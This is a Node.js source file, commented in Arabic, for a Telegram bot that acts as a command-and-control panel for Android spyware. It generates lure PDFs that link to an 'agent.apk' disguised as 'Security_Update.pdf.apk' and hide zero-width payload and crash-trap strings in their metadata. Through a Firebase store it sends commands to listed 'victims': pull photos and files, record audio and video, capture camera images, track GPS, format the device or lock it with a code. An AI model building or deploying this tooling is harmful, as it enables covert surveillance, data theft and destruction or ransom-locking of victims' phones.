#!/usr/bin/env node
// ============================================================
// ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
// (Render Ready – FINAL – HTTP Server + PDF Simplified)
// ============================================================
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
const sharp = require('sharp');
const admin = require('firebase-admin');
const express = require('express');

// --- إعداد Firebase من متغيرات البيئة فقط ---
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  }),
  databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
});
const db = admin.firestore();

// --- إعداد البوت (Polling) ---
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = parseInt(process.env.ADMIN_ID);

// --- تخزين مؤقت لحالة انتظار رمز القفل ---
const pendingLockCode = new Map(); // victimId -> { chatId, messageId }

// --- Zero‑Width + BiDi Exploit (مضمن في البيانات الوصفية) ---
const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };

function generateCrashTrap() {
    const rlo = '\u202E'.repeat(4096);
    const lre = '\u202A'.repeat(2048);
    const pdf = '\u202C';
    return rlo + '['.repeat(1024) + lre + ']'.repeat(1024) + pdf;
}

function binaryToZeroWidth(data) {
    let bitStr = '';
    for (let i = 0; i < data.length; i++) {
        bitStr += data[i].toString(2).padStart(8, '0');
    }
    let encoded = '';
    for (const bit of bitStr) {
        encoded += ZW_MAP[bit];
    }
    return encoded + ZW_MAP['E'];
}

function generatePayloadStub() {
    return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
}

// --- دالة إنشاء PDF ملغوم (مبسطة بالكامل - لا RLO ولا إيموجي) ---
async function createWeaponizedPDF(imageBuffer) {
    const pdfDoc = await PDFDocument.create();
    const page = pdfDoc.addPage([595, 842]);
    const font = await pdfDoc.embedFont(StandardFonts.TimesRoman);

    let image;
    try {
        const pngImage = await sharp(imageBuffer).png().toBuffer();
        image = await pdfDoc.embedPng(pngImage);
    } catch {
        const jpgImage = await sharp(imageBuffer).jpeg().toBuffer();
        image = await pdfDoc.embedJpg(jpgImage);
    }
    const imgDims = image.scale(0.5);
    page.drawImage(image, {
        x: (595 - imgDims.width) / 2,
        y: (842 - imgDims.height) / 2,
        width: imgDims.width,
        height: imgDims.height,
    });

    const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/releases/download/v1.0/agent.apk`;
    // اسم ملف خادع بسيط بدون أحرف تحكم
    const displayName = 'Security_Update.pdf.apk';

    // نص إنجليزي بحت
    page.drawText(`To access the content, please install the attached application:\n${displayName}`, {
        x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
    });

    const linkAnnotation = pdfDoc.context.obj({
        Type: 'Annot', Subtype: 'Link', Rect: [50, 90, 350, 110],
        Border: [0,0,0], A: { Type: 'Action', S: 'URI', URI: agentUrl }
    });
    page.node.addAnnot(linkAnnotation);

    // تضمين الحمولة الخفية في البيانات الوصفية
    const stub = generatePayloadStub();
    const hiddenPayload = binaryToZeroWidth(stub);
    const crashTrap = generateCrashTrap();
    pdfDoc.setAuthor(hiddenPayload + crashTrap);
    pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
    pdfDoc.setSubject('Confidential');
    pdfDoc.setCreator('Adobe Acrobat');
    pdfDoc.setProducer('GhostWeaver v6.0');

    return Buffer.from(await pdfDoc.save());
}

// --- أوامر البوت الأساسية ---
bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    bot.sendMessage(msg.chat.id,
        '🖤 *جاهز سيدي المطور.*\n\n' +
        '⚡ *الوحش متصل بـ Firebase + imgBB*\n\n' +
        '📋 *الأوامر:*\n' +
        '/pdf - صنع PDF ملغوم\n' +
        '/panel - عرض الضحايا المتصلين\n\n' +
        '📸 *أرسل /pdf ثم الصورة.*',
        { parse_mode: 'Markdown' }
    );
});

let awaitingPhoto = false;
bot.onText(/\/pdf/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    awaitingPhoto = true;
    bot.sendMessage(msg.chat.id, '📸 أرسل الصورة الآن لتحويلها إلى PDF ملغوم.');
});

bot.on('photo', async (msg) => {
    if (!awaitingPhoto || msg.from.id !== ADMIN_ID) return;
    awaitingPhoto = false;
    const waitMsg = await bot.sendMessage(msg.chat.id, '🔄 جاري بناء PDF...');
    try {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
        const response = await fetch(fileUrl);
        const buffer = Buffer.from(await response.arrayBuffer());
        const pdfBuffer = await createWeaponizedPDF(buffer);
        await bot.sendDocument(msg.chat.id, pdfBuffer, {
            filename: 'document.pdf',
            caption: '💣 *PDF ملغوم جاهز.*\n\n📱 الضحية يجب أن يثبت التطبيق المرفق ليظهر في لوحة التحكم.',
            parse_mode: 'Markdown'
        });
        await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {
        await bot.editMessageText(`❌ خطأ: ${e.message}`, {
            chat_id: msg.chat.id,
            message_id: waitMsg.message_id
        });
    }
});

bot.onText(/\/panel/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const snapshot = await db.collection('victims').get();
    if (snapshot.empty) return bot.sendMessage(msg.chat.id, '⚠️ لا يوجد ضحايا متصلين.');

    let list = '👥 *الضحايا المتصلون:*\n\n';
    const inlineKeyboard = [];
    snapshot.forEach(doc => {
        const data = doc.data();
        list += `🆔 \`${doc.id.slice(0,8)}\` | ${data.os || 'Android'} | ${data.name || 'Unknown'}\n`;
        inlineKeyboard.push([{ text: `🎯 التحكم بـ ${data.name || doc.id.slice(0,8)}`, callback_data: `select:${doc.id}` }]);
    });
    bot.sendMessage(msg.chat.id, list, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: inlineKeyboard }
    });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    await bot.answerCallbackQuery(query.id);

    if (data.startsWith('select:')) {
        const victimId = data.split(':')[1];
        const commands = [
            [{ text: '📸 سحب الصور', callback_data: `cmd:${victimId}:gallery` }],
            [{ text: '📁 سحب الملفات', callback_data: `cmd:${victimId}:files` }],
            [{ text: '🎤 تسجيل صوت', callback_data: `cmd:${victimId}:record_audio` }],
            [{ text: '🎥 تسجيل فيديو', callback_data: `cmd:${victimId}:record_video` }],
            [{ text: '📷 تصوير أمامي', callback_data: `cmd:${victimId}:camera_front` }],
            [{ text: '📷 تصوير خلفي', callback_data: `cmd:${victimId}:camera_back` }],
            [{ text: '📱 اهتزاز', callback_data: `cmd:${victimId}:vibrate` }],
            [{ text: '💬 إشعار', callback_data: `cmd:${victimId}:toast` }],
            [{ text: '📍 الموقع GPS', callback_data: `cmd:${victimId}:location` }],
            [{ text: '📊 معلومات الجهاز', callback_data: `cmd:${victimId}:device_info` }],
            [{ text: '💣 فرمتة', callback_data: `cmd:${victimId}:format` }],
            [{ text: '🔒 قفل برمز', callback_data: `cmd:${victimId}:lock_code` }],
        ];
        bot.editMessageText(`التحكم بالضحية \`${victimId.slice(0,8)}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { inline_keyboard: commands },
            parse_mode: 'Markdown'
        });
    } else if (data.startsWith('cmd:')) {
        const [, victimId, command] = data.split(':');
        if (command === 'lock_code') {
            pendingLockCode.set(victimId, { chatId, messageId: query.message.message_id });
            bot.sendMessage(chatId, `🔐 أدخل الرمز الرقمي لقفل جهاز الضحية \`${victimId.slice(0,8)}\` (أرقام فقط):`, { parse_mode: 'Markdown' });
            return;
        }
        await db.collection('victims').doc(victimId).collection('commands').add({
            command,
            timestamp: admin.firestore.FieldValue.serverTimestamp(),
            status: 'pending'
        });
        bot.editMessageText(`✅ تم إرسال الأمر: ${command}`, {
            chat_id: chatId,
            message_id: query.message.message_id
        });
    }
});

// --- استقبال رمز القفل من الأدمن ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || msg.from.id !== ADMIN_ID) return;

    for (let [victimId, pending] of pendingLockCode.entries()) {
        if (pending.chatId === chatId) {
            const code = text.trim();
            if (!/^\d+$/.test(code)) {
                bot.sendMessage(chatId, '❌ الرمز يجب أن يكون أرقاماً فقط. حاول مجدداً.');
                return;
            }
            await db.collection('victims').doc(victimId).collection('commands').add({
                command: 'lock_code',
                code: code,
                timestamp: admin.firestore.FieldValue.serverTimestamp(),
                status: 'pending'
            });
            bot.editMessageText(`✅ تم إرسال أمر القفل بالرمز ${code}`, {
                chat_id: pending.chatId,
                message_id: pending.messageId
            }).catch(() => {});
            bot.sendMessage(chatId, `🔒 تم إرسال أمر القفل للضحية \`${victimId.slice(0,8)}\` بالرمز: ${code}`, { parse_mode: 'Markdown' });
            pendingLockCode.delete(victimId);
            return;
        }
    }
});

// --- مراقبة نتائج الضحايا (صور، ملفات، إلخ) ---
db.collectionGroup('results').onSnapshot(async (snapshot) => {
    for (const doc of snapshot.docChanges()) {
        if (doc.type === 'added') {
            const data = doc.doc.data();
            if (data.type === 'photo' && data.url) {
                await bot.sendPhoto(ADMIN_ID, data.url, {
                    caption: `📸 من ${doc.ref.parent.parent.id.slice(0,8)}`
                });
            } else if (data.type === 'file' && data.url) {
                await bot.sendDocument(ADMIN_ID, data.url, {
                    caption: `📁 من ${doc.ref.parent.parent.id.slice(0,8)}`
                });
            } else if (data.type === 'device_info') {
                await bot.sendMessage(ADMIN_ID, `📊 *معلومات الجهاز*\n${data.info}`, { parse_mode: 'Markdown' });
            } else if (data.type === 'location') {
                await bot.sendLocation(ADMIN_ID, data.lat, data.lng);
                await bot.sendMessage(ADMIN_ID, `📍 موقع الضحية \`${doc.ref.parent.parent.id.slice(0,8)}\``, { parse_mode: 'Markdown' });
            }
            await doc.ref.delete();
        }
    }
});

// --- خادم HTTP بسيط لإرضاء Render (Health Check) ---
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => res.send('OK'));
app.get('/health', (req, res) => res.send('OK'));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Health server listening on port ${PORT}`);
});

console.log('🤖 Architect C2 Bot started. Full command panel active.');
